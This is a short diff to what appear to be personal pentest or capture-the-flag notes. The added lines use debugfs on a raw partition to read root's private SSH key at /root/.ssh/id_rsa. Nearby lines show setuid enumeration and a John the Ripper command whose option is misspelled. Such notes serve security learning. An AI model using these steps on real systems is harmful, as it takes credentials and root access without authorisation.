@@ -277,6 +277,11 @@ Enum Notes:
   - To list setuid binaries: find / -perm -4000 2>/dev/null
   - internal.conf can potentially be found at /etc/apache2/sites-enabled
   - List files and folder owned by a user: find / -user jimmy 2>/dev/null
+  - Priv esc using df:
+  	- List partitions: df -h
+	- Access partitions: debugfs /dev/sda5
+		- cd /root/.ssh
+		- cat id_rsa
 
 John: 
 	- john --worldlist=rockyou.txt <hash file>
